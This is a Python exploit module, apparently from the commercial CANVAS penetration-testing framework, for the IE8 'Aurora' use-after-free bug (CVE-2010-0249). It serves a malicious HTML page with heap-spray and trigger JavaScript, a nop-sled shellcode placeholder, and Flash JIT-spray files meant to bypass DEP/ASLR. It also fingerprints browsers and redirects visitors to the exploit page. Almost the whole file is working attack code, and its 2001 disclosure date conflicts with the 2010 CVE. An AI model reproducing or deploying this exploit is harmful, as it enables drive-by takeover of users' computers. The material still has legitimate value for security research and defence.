#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside

NAME='Aurora vulnerability with ActionScript JIT spraying for IE8 and Windows 7'
DESCRIPTION='ActionScript JIT spraying for IE8 and Windows 7'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='01/21/2001'
DOCUMENTATION['References']='MS10-002'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2010-0249'
DOCUMENTATION['CVE Url'] = ''
DOCUMENTATION['CVSS'] = 9.3


VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003','Vista', '7']
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
Run using the httpserver from the CANVAS GUI.

This exploit demonstrates the Flash JIT technique for bypassing DEP/ASLR on Windows 7. This
will successfully exploit Windows XP/7 using IE8 (unpatched for MS10-002).

Note: the exploit does not work against Vista.
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect (N/A)','0,0,0,0'],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion=0
        self.badstring='\0\xff'
        self.name=NAME 
        self.htmlfilename='test.html'
        self.htmlfilename='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb/testaaaaaaaaaaaaaaa.html'
        self.swffilename='Resources/aurora_flash/spray.swf'
        self.swffilename2='Resources/aurora_flash/sploitbig.swf'
        self.jsfilename='AC_RunActiveContent.js'
        self.refresh_rate = 60
        return

    def is_vulnerable(self, info_dict):
        """
        Check to make sure this is something we want to run,
        in this case, it means running IE 8.
        """ 
        if "MSIE 8.0" in info_dict['user_agent']:
            if info_dict.get("plugins") and info_dict['plugins'].get('IE Flash'):
                #high value because it is reliable, recent and it defeats dep
                return 40
            else:
                devlog("aurora_flash", "IE8 but we need flash to run this version")
        else:
            devlog("aurora_flash", "Not IE8 - possibly vulnerable, but not to this exploit")
        #not ie 6/7 or it doesnt have flash
        return 0

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()

    def createShellcode(self):
        return self.createWin32ClientSideShellcode()

    def makeJS(self):
        js="""//v1.7
// Flash Player Version Detection
// Detect Client Browser type
// Copyright 2005-2007 Adobe Systems Incorporated.  All rights reserved.
var isIE  = (navigator.appVersion.indexOf("MSIE") != -1) ? true : false;
var isWin = (navigator.appVersion.toLowerCase().indexOf("win") != -1) ? true : false;
var isOpera = (navigator.userAgent.indexOf("Opera") != -1) ? true : false;

function ControlVersion()
{
          var version;
          var axo;
          var e;

          // NOTE : new ActiveXObject(strFoo) throws an exception if strFoo isn't in the registry

          try {
          // version will be set for 7.X or greater players
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
          version = axo.GetVariable("$version");
          } catch (e) {
          }

          if (!version)
          {
          try {
          // version will be set for 6.X players only
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");

          // installed player is some revision of 6.0
          // GetVariable("$version") crashes for versions 6.0.22 through 6.0.29,
          // so we have to be careful. 

          // default to the first public version
          version = "WIN 6,0,21,0";

          // throws if AllowScripAccess does not exist (introduced in 6.0r47)		
          axo.AllowScriptAccess = "always";

          // safe to call for 6.0r47 or greater
          version = axo.GetVariable("$version");

          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 4.X or 5.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
          version = axo.GetVariable("$version");
          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 3.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
          version = "WIN 3,0,18,0";
          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 2.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
          version = "WIN 2,0,0,11";
          } catch (e) {
          version = -1;
          }
          }

          return version;
}

// JavaScript helper required to detect Flash Player PlugIn version information
function GetSwfVer(){
          // NS/Opera version >= 3 check for Flash plugin in plugin array
          var flashVer = -1;

          if (navigator.plugins != null && navigator.plugins.length > 0) {
          if (navigator.plugins["Shockwave Flash 2.0"] || navigator.plugins["Shockwave Flash"]) {
          var swVer2 = navigator.plugins["Shockwave Flash 2.0"] ? " 2.0" : "";
          var flashDescription = navigator.plugins["Shockwave Flash" + swVer2].description;
          var descArray = flashDescription.split(" ");
          var tempArrayMajor = descArray[2].split(".");			
          var versionMajor = tempArrayMajor[0];
          var versionMinor = tempArrayMajor[1];
          var versionRevision = descArray[3];
          if (versionRevision == "") {
          versionRevision = descArray[4];
          }
          if (versionRevision[0] == "d") {
          versionRevision = versionRevision.substring(1);
          } else if (versionRevision[0] == "r") {
          versionRevision = versionRevision.substring(1);
          if (versionRevision.indexOf("d") > 0) {
          versionRevision = versionRevision.substring(0, versionRevision.indexOf("d"));
          }
          }
          var flashVer = versionMajor + "." + versionMinor + "." + versionRevision;
          }
          }
          // MSN/WebTV 2.6 supports Flash 4
          else if (navigator.userAgent.toLowerCase().indexOf("webtv/2.6") != -1) flashVer = 4;
          // WebTV 2.5 supports Flash 3
          else if (navigator.userAgent.toLowerCase().indexOf("webtv/2.5") != -1) flashVer = 3;
          // older WebTV supports Flash 2
          else if (navigator.userAgent.toLowerCase().indexOf("webtv") != -1) flashVer = 2;
          else if ( isIE && isWin && !isOpera ) {
          flashVer = ControlVersion();
          }	
          return flashVer;
}

// When called with reqMajorVer, reqMinorVer, reqRevision returns true if that version or greater is available
function DetectFlashVer(reqMajorVer, reqMinorVer, reqRevision)
{
          versionStr = GetSwfVer();
          if (versionStr == -1 ) {
          return false;
          } else if (versionStr != 0) {
          if(isIE && isWin && !isOpera) {
          // Given "WIN 2,0,0,11"
          tempArray         = versionStr.split(" "); 	// ["WIN", "2,0,0,11"]
          tempString        = tempArray[1];			// "2,0,0,11"
          versionArray      = tempString.split(",");	// ['2', '0', '0', '11']
          } else {
          versionArray      = versionStr.split(".");
          }
          var versionMajor      = versionArray[0];
          var versionMinor      = versionArray[1];
          var versionRevision   = versionArray[2];

          // is the major.revision >= requested major.revision AND the minor version >= requested minor
          if (versionMajor > parseFloat(reqMajorVer)) {
          return true;
          } else if (versionMajor == parseFloat(reqMajorVer)) {
          if (versionMinor > parseFloat(reqMinorVer))
          return true;
          else if (versionMinor == parseFloat(reqMinorVer)) {
          if (versionRevision >= parseFloat(reqRevision))
          return true;
          }
          }
          return false;
          }
}

function AC_AddExtension(src, ext)
{
          if (src.indexOf('?') != -1)
          return src.replace(/\?/, ext+'?'); 
          else
          return src + ext;
}

function AC_Generateobj(objAttrs, params, embedAttrs) 
{ 
          var str = '';
          if (isIE && isWin && !isOpera)
          {
          str += '<object ';
          for (var i in objAttrs)
          {
          str += i + '="' + objAttrs[i] + '" ';
          }
          str += '>';
          for (var i in params)
          {
          str += '<param name="' + i + '" value="' + params[i] + '" /> ';
          }
          str += '</object>';
          }
          else
          {
          str += '<embed ';
          for (var i in embedAttrs)
          {
          str += i + '="' + embedAttrs[i] + '" ';
          }
          str += '> </embed>';
          }

          document.write(str);
}

function AC_FL_RunContent(){
          var ret = 
          AC_GetArgs
          (  arguments, ".swf", "movie", "clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"
          , "application/x-shockwave-flash"
          );
          AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
}

function AC_SW_RunContent(){
          var ret = 
          AC_GetArgs
          (  arguments, ".dcr", "src", "clsid:166B1BCA-3F9C-11CF-8075-444553540000"
          , null
          );
          AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
}

function AC_GetArgs(args, ext, srcParamName, classid, mimeType){
          var ret = new Object();
          ret.embedAttrs = new Object();
          ret.params = new Object();
          ret.objAttrs = new Object();
          for (var i=0; i < args.length; i=i+2){
          var currArg = args[i].toLowerCase();    

          switch (currArg){	
          case "classid":
          break;
          case "pluginspage":
          ret.embedAttrs[args[i]] = args[i+1];
          break;
          case "src":
          case "movie":	
          args[i+1] = AC_AddExtension(args[i+1], ext);
          ret.embedAttrs["src"] = args[i+1];
          ret.params[srcParamName] = args[i+1];
          break;
          case "onafterupdate":
          case "onbeforeupdate":
          case "onblur":
          case "oncellchange":
          case "onclick":
          case "ondblclick":
          case "ondrag":
          case "ondragend":
          case "ondragenter":
          case "ondragleave":
          case "ondragover":
          case "ondrop":
          case "onfinish":
          case "onfocus":
          case "onhelp":
          case "onmousedown":
          case "onmouseup":
          case "onmouseover":
          case "onmousemove":
          case "onmouseout":
          case "onkeypress":
          case "onkeydown":
          case "onkeyup":
          case "onload":
          case "onlosecapture":
          case "onpropertychange":
          case "onreadystatechange":
          case "onrowsdelete":
          case "onrowenter":
          case "onrowexit":
          case "onrowsinserted":
          case "onstart":
          case "onscroll":
          case "onbeforeeditfocus":
          case "onactivate":
          case "onbeforedeactivate":
          case "ondeactivate":
          case "type":
          case "codebase":
          case "id":
          ret.objAttrs[args[i]] = args[i+1];
          break;
          case "width":
          case "height":
          case "align":
          case "vspace": 
          case "hspace":
          case "class":
          case "title":
          case "accesskey":
          case "name":
          case "tabindex":
          ret.embedAttrs[args[i]] = ret.objAttrs[args[i]] = args[i+1];
          break;
          default:
          ret.embedAttrs[args[i]] = ret.params[args[i]] = args[i+1];
          }
          }
          ret.objAttrs["classid"] = classid;
          if (mimeType) ret.embedAttrs["type"] = mimeType;
          return ret;
}
"""
        return js

    def makeSWF(self):
        f = open(self.swffilename, 'rb+')
        swf = f.read()
        f.close()
        return swf

    def makeSWF2(self):
        f = open(self.swffilename2, 'rb+')
        swf = f.read()
        f.close()
        return swf

    def makeHTML(self):
        html="""<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Test</title>
<script language="javascript">AC_FL_RunContent = 0;</script>
<script src="AC_RunActiveContent.js" language="javascript"></script>
</head>
<body bgcolor="#ffffff">
<!--url's used in the movie-->
<!--text used in the movie-->
<!-- saved from url=(0013)about:internet -->
<img id="ico" src="favicon.ico"></img>
<script language="javascript">
  var x1;
  var e1=null;
  var g = unescape("\u3068\u6B30SHELLCODE\u3063\u6B30");


  function ev1(evt) {
    x1=new Array();
    for (i=0; i<1; i++){
     x1[i]=document.createElement("COMMENT");
     x1[i].data="abc";
    }
    e1=document.createEventObject(evt);
    document.getElementById("sp2").innerHTML="";
    window.setTimeout(ev2,1);

  }

  function ev2() {
 // 7 - XP  
 var p = unescape("\u005B\u6000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
 // XP with no acroreader 
 // var p = unescape("\u005E\u12E0\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");

  var x_array = new Array();
    
  for (i=0;i<10000;i++)
  {
  var client = new XMLHttpRequest();
   client.open("GET", p);
   x_array[i] = client;
  }
    e1.srcElement;

   g = "";
   x_array = new Array();
  }
</script>
<script>
  function triggerCrash() {
   //document.write('<pre>AAAAAAAA</pre>');
   //document.write('<img id="sp1" src="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gif" onload="ev1(event)"></img>');
    document.getElementById("sp2").innerHTML='<img id="sp1" src="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gif" onload="ev1(event)"></img>';
  }


            if (AC_FL_RunContent == 0) {
            alert("This page requires AC_RunActiveContent.js.");
            } else {
            AC_FL_RunContent(
            'codebase', 'http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0',
            'width', '550',
            'height', '400',
            'src', 'SWFBASENAME',
            'quality', 'high',
            'pluginspage', 'http://www.macromedia.com/go/getflashplayer',
            'align', 'middle',
            'play', 'true',
            'loop', 'true',
            'scale', 'showall',
            'wmode', 'window',
            'devicefont', 'false',
            'id', 'SWFBASENAME',
            'bgcolor', '#ffffff',
            'name', 'SWFBASENAME',
            'menu', 'true',
            'allowFullScreen', 'false',
            'allowScriptAccess','sameDomain',
            'movie', 'SWFBASENAME',
            'salign', ''
            ); //end AC code
            }

</script>
<span id="sp2">
</span>
</body>
</html>
""".replace('SWFBASENAME',self.swffilename[:self.swffilename.find('.')])

        sc = urluencode('\x90'*400+self.shellcode)
        if (len(sc) % 4) != 0:
            sc = '\x90' * (4 - (len(sc) % 4)) + sc

        sc = sc.replace('%u', '\\u')
        html = html.replace('SHELLCODE', sc)
        return html

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        self.log('Requested URL: %s' % clientheader.URL)
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            self.createShellcode()
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.jsfilename):
            self.log('Serving JS file')
            b.setBody(self.makeJS())
            h.addHeader('Content-Type','text/javascript')
        elif clientheader.URL.count(self.swffilename):
            flash_version=clientheader.getStrValue(['x-flash-version'])
            flash_version=flash_version.replace(',','.')
            for i in range(len(targets)):
                if flash_version==targets[i][1]:
                    self.clientversion=i
                    break
            self.log('Serving SWF file for Adobe Flash Player v%s'%(flash_version))
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type','application/x-shockwave-flash')
        elif clientheader.URL.count("heapspray"):
            flash_version=clientheader.getStrValue(['x-flash-version'])
            flash_version=flash_version.replace(',','.')
            for i in range(len(targets)):
                if flash_version==targets[i][1]:
                    self.clientversion=i
                    break
            self.log('Serving SWF file for Adobe Flash Player v%s'%(flash_version))
            b.setBody(self.makeSWF2())
            h.addHeader('Content-Type','application/x-shockwave-flash')
        elif clientheader.URL.count('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gif'):
            self.log('Serving GIF file')
            b.setBody('47494638396101000100910000fffffffffffffe010200000021f904041400ff002c00000000010001000002024401003b'.decode('hex')) #1x1 GIF
            h.addHeader('Content-Type','image/gif')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        self.swffilename=self.argsDict.get('swffilename',self.swffilename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        self.clientversion=self.version
        filedata=self.makeSWF()
        self.log('Opening %s for output'%(self.swffilename))
        fd=file(self.swffilename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.swffilename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
